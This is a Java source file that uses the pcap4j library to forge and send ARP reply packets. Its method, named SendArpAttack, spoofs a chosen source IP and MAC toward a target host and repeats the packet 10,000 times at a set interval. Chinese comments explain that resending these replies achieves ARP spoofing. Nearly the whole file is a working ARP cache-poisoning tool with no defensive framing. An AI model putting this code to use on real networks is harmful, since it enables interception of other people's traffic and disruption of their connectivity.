package com.gud.job;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PacketListener;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.core.Pcaps;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;
import sun.applet.Main;

public class SendArpRequest {

    private static final String COUNT_KEY = SendArpRequest.class.getName() + ".count";
    private static final int COUNT = Integer.getInteger(COUNT_KEY, 1);

    private static final String READ_TIMEOUT_KEY = SendArpRequest.class.getName() + ".readTimeout";
    private static final int READ_TIMEOUT = Integer.getInteger(READ_TIMEOUT_KEY, 10); // [ms]

    private static final String SNAPLEN_KEY = SendArpRequest.class.getName() + ".snaplen";
    private static final int SNAPLEN = Integer.getInteger(SNAPLEN_KEY, 65536); // [bytes]

    // 发送 ARP 请求的源 MAC地址, 需填写正确, 否则接收不到 ARP 响应, 格式为: "-" 或 ":" 分隔开
    // D0-C6-37-3E-7A-fB, d0-c6-37-3e-7a-fb, d0:c6:37:3e:7a:fb 均可, 不区分大小写
    //private static final MacAddress SRC_MAC_ADDR = MacAddress.getByName("26-DB-CA-BD-FB-4B");
    //private static final MacAddress DST_MAC_ADDR=MacAddress.getByName("a4-83-e7-88-35-6b");

    // 响应的 MAC 地址IP：192.168.1.104 | MAC：60-14-B3-BB-C6-41 | 无线连接
    private static MacAddress resolvedAddr;


    public static void SendArpAttack(String nifStr,String srcIP,String srcMAC,String destIP,String destMAC,int rate) throws PcapNativeException, NotOpenException {
        // 源 IP 地址, 需填写正确
        //String strSrcIpAddress = "192.168.1.1"; // for InetAddress.getByName()
        MacAddress SRC_MAC_ADDR = MacAddress.getByName(srcMAC);
        MacAddress DST_MAC_ADDR=MacAddress.getByName(destMAC);
        String strSrcIpAddress = srcIP;
        // 目的 IP 地址, 需填写正确
        //String strDstIpAddress = "192.168.1.106"; // for InetAddress.getByName()
        String strDstIpAddress = destIP;

        System.out.println(COUNT_KEY + ": " + COUNT);
        System.out.println(READ_TIMEOUT_KEY + ": " + READ_TIMEOUT);
        System.out.println(SNAPLEN_KEY + ": " + SNAPLEN);
        System.out.println("\n");

        PcapNetworkInterface nif;
        nif=Pcaps.getDevByName(nifStr);

        if (nif == null) {
            return;
        }

        System.out.println(nif.getName() + "(" + nif.getDescription() + ")");


        PcapHandle sendHandle = nif.openLive(SNAPLEN, PromiscuousMode.PROMISCUOUS, READ_TIMEOUT);

        try {
            // 以下是构造 ARP 数据包的过程
            // 初始化一个 ArpBuilder 对象用于操作 ARP 数据包
            ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
            try {
                // 添加参数
                arpBuilder
                        .hardwareType(ArpHardwareType.ETHERNET) // 硬件类型为以太网, 如果电脑连接的是 WiFi 热点, 也可改为 IEEE.802, 总之必须对应上
                        .protocolType(EtherType.IPV4) // 协议类型为 IPV4
                        .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES) // MAC 长度
                        .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES) // IP 长度
                        .operation(ArpOperation.REPLY) // ARP 类型为: 回复
                        .srcHardwareAddr(SRC_MAC_ADDR) // 源 MAC
                        .srcProtocolAddr(InetAddress.getByName(strSrcIpAddress)) // 源 IP
                        // 目的MAC: 广播地址, 也可改为 MacAddress.getByName("ff-ff-ff-ff-ff-ff")
                        //.dstHardwareAddr(MacAddress.ETHER_BROADCAST_ADDRESS)
                        .dstHardwareAddr(DST_MAC_ADDR)
                        // 目的 IP
                        .dstProtocolAddr(InetAddress.getByName(strDstIpAddress));
            } catch (UnknownHostException e) {
                throw new IllegalArgumentException(e); // 参数错误异常
            }

            // 以下是构造以太网帧的过程
            // 初始化一个 etherBuilder 对象用于操作帧
            EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
            etherBuilder
                    .dstAddr(DST_MAC_ADDR)
                    .srcAddr(SRC_MAC_ADDR)
                    .type(EtherType.ARP) // 帧类型
                    .payloadBuilder(arpBuilder) // 由于 ARP 请求是包含在帧里的, 故需要做一个 payload
                    .paddingAtBuild(true); // 是否填充至以太网的最小帧长, 必须为 true, 否则对方不会接受请求

            // 发送 count 个请求, 请注意如果将 count 改为无限, 每隔一定时间向目的战点发送特定的 ARP 请求, 即可达到 ARP 欺骗的作用
            for (int i = 0; i < 10000; i++) {
                Packet p = etherBuilder.build();
                System.out.println(p);
                sendHandle.sendPacket(p);
                try {
                    Thread.sleep(rate*1000);
                } catch (InterruptedException e) {
                    break;
                }
            }// 最后, 回收资源
        } finally {

            if (sendHandle != null && sendHandle.isOpen()) {
                sendHandle.close();
            }

            System.out.println(strDstIpAddress + " was resolved to " + resolvedAddr);
        }
    }
}
